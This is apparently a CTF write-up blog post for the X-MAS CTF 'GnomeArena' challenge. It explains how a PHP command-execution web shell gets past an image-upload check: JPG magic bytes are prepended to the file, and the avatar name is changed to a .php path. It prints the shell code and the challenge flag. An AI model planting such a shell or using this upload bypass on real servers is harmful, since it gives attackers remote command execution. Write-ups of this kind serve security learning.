---
layout: post
title: "X-MAS CTF: GnomeArena: Rock Paper Scissors"
date: 2018-12-21
excerpt: "Cool file upload vulnerability followed by a minimalist php shell!"
tags: [CTF, PHP, Web, File Upload]
comments: true
feature: https://pxt.azureedge.net/blob/68f66c3ddc3acfc4c53157abf92eace202d46db2/static/courses/csintro/conditionals/rock-paper-scissors-items.png
---

# X-MAS CTF: GnomeArena: Rock Paper Scissors

The challenge description is:

![Img](/assets/posts_details/XMAS_CTF/gnome/intro.png "Img")

So going to the page we find out that there is a game with a settings page on the top right corner which looks way more interesting for us than the game itself.

![Img](/assets/posts_details/XMAS_CTF/gnome/main.png "Img")

![Img](/assets/posts_details/XMAS_CTF/gnome/settings.png "Img")

So I tried to modify a few parameters and see what changes were in the page. I noticed that the profile picture is stored under ``avatar/name`` and that whenever I change the name the path of the picture changes as well.

![Img](/assets/posts_details/XMAS_CTF/gnome/name.png "Img")

With that in mind, I tried to upload a simple PHP shell to execute commands:

```php
<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>
```

However, I got a warning saying that the file needed to be an image. That's when I had an inspiration that helped me solve the challenge.

1. Rename the shell.php to shell.jpg and append at the start of the file JPG's magic number: ``FF D8 FF``. That way, the shell will be recognised as an image but it will be executed later.
2. Change the name to something.php, in this case I used ``root2u.php``.

Then, I just needed to access ``avatar/root2u.php?cmd=`` and use any linux command I liked!

![Img](/assets/posts_details/XMAS_CTF/gnome/rev_1.png "Img")

Now, It's just a matter of time before we find the location of the flag.

![Img](/assets/posts_details/XMAS_CTF/gnome/rev_2.png "Img")

![Img](/assets/posts_details/XMAS_CTF/gnome/flag.png "Img")

And we get our flag: ``X-MAS{Ev3ry0ne_m0ve_aw4y_th3_h4ck3r_gn0m3_1s_1n_t0wn}``.

---

<center>
<i>Diego Bernal Adelantado</i>
</center>
